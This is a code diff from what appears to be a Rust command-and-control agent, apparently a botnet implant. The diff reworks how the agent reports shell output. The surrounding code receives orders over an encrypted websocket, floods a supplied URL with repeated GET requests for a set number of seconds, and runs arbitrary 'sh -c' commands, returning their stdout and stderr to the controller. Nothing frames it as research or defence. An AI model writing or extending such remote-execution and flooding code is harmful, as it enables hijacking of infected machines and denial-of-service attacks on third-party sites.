@@ -309,8 +309,7 @@ impl Agent {
                                             if json["action"] == "access" {
                                                 let url = json["url"].as_str().unwrap_or("");
                                                 let secs = json["duration_secs"].as_u64().unwrap_or(0);
-                                                let end_time = std::time::Instant::now()
-                                                    + Duration::from_secs(secs);
+                                                let end_time = std::time::Instant::now() + Duration::from_secs(secs);
                                                 while std::time::Instant::now() < end_time {
                                                     let _ = self.client.get(url).send().await;
                                                 }
@@ -319,11 +318,20 @@ impl Agent {
                                                     .arg("-c")
                                                     .arg(&cmd)
                                                     .output()
-                                                    .await?;
-                                                let output_str = String::from_utf8_lossy(&output.stdout).to_string();
-                                                let response_msg = serde_json::to_string(&C2Message::CommandResponse { output: output_str })?;
-                                                let encrypted = self.encrypt_message(&response_msg).await?;
-                                                self.ws.send(Message::binary(encrypted)).await?;
+                                                    .await;
+                                                match output {
+                                                    Ok(output) => {
+                                                        let output_str = String::from_utf8_lossy(&output.stdout).to_string();
+                                                        let stderr_str = String::from_utf8_lossy(&output.stderr).to_string();
+                                                        eprintln!("Agent {} executed command '{}', stdout: {}, stderr: {}", self.uuid, cmd, output_str, stderr_str);
+                                                        let response_msg = serde_json::to_string(&C2Message::CommandResponse {
+                                                            output: format!("stdout: {}\nstderr: {}", output_str, stderr_str),
+                                                        })?;
+                                                        let encrypted = self.encrypt_message(&response_msg).await?;
+                                                        self.ws.send(Message::binary(encrypted)).await?;
+                                                    }
+                                                    Err(e) => eprintln!("Agent {} failed to execute command '{}': {}", self.uuid, cmd, e),
+                                                }
                                             }
                                         }
                                     }
